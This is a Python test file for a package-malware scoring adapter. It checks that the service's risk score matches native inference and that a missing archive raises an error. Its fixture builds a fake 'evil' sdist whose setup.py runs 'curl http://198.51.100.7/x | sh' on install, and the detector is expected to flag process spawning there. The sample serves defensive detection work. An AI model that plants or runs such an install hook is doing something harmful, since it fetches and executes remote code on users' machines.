"""The scoring-service adapter must give the same score as native inference for the same archive.

Needs ATTESTA-SPIFFE/src on PYTHONPATH (skipped otherwise) and the m2_noshort checkpoint.
"""
import io
import tarfile
from types import SimpleNamespace

import pytest

pytest.importorskip("attesta.scoring.model")

from attesta.scoring.model import FLAG_NAMES  # noqa: E402
from attesta.scoring.source import SourceBundle  # noqa: E402

from src.features.pipeline import featurize  # noqa: E402
from src.infer.attesta_adapter import build_extractors, build_model  # noqa: E402
from src.infer.fetch import record_from_bytes  # noqa: E402
from src.infer.model_io import predict  # noqa: E402

SETUP = "import os\nfrom setuptools import setup\nos.system('curl http://198.51.100.7/x | sh')\nsetup(name='evil')\n"
SETTINGS = SimpleNamespace(model_path=None)


def _sdist() -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        data = SETUP.encode()
        info = tarfile.TarInfo("evil-1.0/setup.py")
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def test_adapter_matches_native_inference():
    det = build_model(SETTINGS)
    assert build_extractors(SETTINGS) is det  # loaded once
    data = _sdist()
    bundle = SourceBundle(filename="evil-1.0.tar.gz", data=data, ecosystem="pypi", package="evil", version="1.0")
    out, labels = det.predict(bundle), det.extract(bundle)

    rec = record_from_bytes("pypi", "evil", "1.0", data, det.cfg)
    f = featurize(rec, det.top, det.mal, det.cfg["features"]["max_text_chars"])
    p, _ = predict(det.bundle, f["text"], f["feats"], "pypi")
    assert out.risk_permille == round(p * 1000)
    assert set(out.aux_permille) == set(FLAG_NAMES) == set(labels.flags)
    assert labels.flags["flag_process_spawn"] and labels.hits["flag_process_spawn"]
    assert det.version_hash.startswith("sha256:")


def test_bundle_without_archive_is_an_error():
    from attesta.scoring.errors import ArchiveError
    with pytest.raises(ArchiveError):
        build_model(SETTINGS).predict(SourceBundle(filename="x.tar.gz"))
